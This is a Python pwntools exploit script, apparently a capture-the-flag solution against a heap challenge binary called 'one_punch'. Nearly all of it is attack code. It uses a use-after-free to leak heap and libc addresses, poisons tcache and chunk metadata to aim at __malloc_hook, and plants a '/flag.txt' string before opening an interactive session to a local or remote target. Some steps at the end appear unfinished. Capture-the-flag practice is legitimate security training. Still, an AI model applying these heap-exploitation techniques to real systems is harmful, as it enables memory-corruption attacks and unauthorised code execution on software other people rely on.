from pwn import *

context.arch = 'amd64'

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))
		

def cmd(c):
	p.recvuntil("> ")
	p.sendline(str(c))
	
def add(idx,name):
	cmd(1)
	p.recvuntil("idx: ")
	p.sendline(str(idx))
	p.recvuntil("name: ")
	p.send(name)
def dele(idx):
	cmd(4)
	p.recvuntil("idx: ")
	p.sendline(str(idx))

def show(idx):
	cmd(3)
	p.recvuntil("idx: ")
	p.sendline(str(idx))

def edit(idx,name):
	cmd(2)
	p.recvuntil("idx: ")
	p.sendline(str(idx))
	p.recvuntil("name: ")
	p.send(name)

def main(host,port=26976):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./one_punch")
		# debug(0x0000000000015BB)
		gdb.attach(p,"b *setcontext+53")
	add(0,"A"*0x210)
	dele(0)
	add(1,"A"*0x210)
	dele(1)
	show(1)
	p.recvuntil(" name: ")
	heap = u64(p.recvuntil("\n",drop=True).ljust(8,b"\x00")) - 0x260
	for i in range(5):
		add(2,"A"*0x210)
		dele(2)
	add(0,"A"*0x210)
	add(1,"A"*0x210)
	dele(0)
	show(0)
	p.recvuntil(" name: ")
	libc.address = u64(p.recvuntil("\n",drop=True).ljust(8,b"\x00")) - 0x1e4ca0
	info("heap : " + hex(heap))
	info("libc : " + hex(libc.address))
	dele(1)
	edit(2,p64(libc.symbols["__malloc_hook"]))
	add(0,"D"*0x90)
	dele(0)
	for i in range(7):
		add(0,"D"*0x80)
		dele(0)
	for i in range(7):
		add(0,"D"*0x200)
		dele(0)
	add(0,"D"*0x200)
	add(1,"A"*0x210)
	add(2,p64(0x21)*(0x90//8))
	edit(2,p64(0x21)*(0x90//8))
	dele(2)
	add(2,p64(0x21)*(0x90//8))
	edit(2,p64(0x21)*(0x90//8))
	dele(2)
	
	dele(0)
	dele(1)
	add(0,"A"*0x80)
	add(1,"A"*0x80)
	dele(0)
	dele(1)
	
	add(0,b"A"*0x88 + p64(0x421) + b"D"*0x180 )
	add(2,"A"*0x200)
	
	dele(1)
	dele(2)
	# pause()
	add(2,"A"*0x200)
	edit(0,b"A"*0x88 + p64(0x421) + p64(libc.address + 0x1e5090)*2 + p64(0) + p64(heap+0x10) )
	
	dele(0)
	dele(2)
	
	pause()
	add(0,b"/flag.txt"+b"\x00"*7 + b"A"*0x1f0)
	
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	main(args['REMOTE'])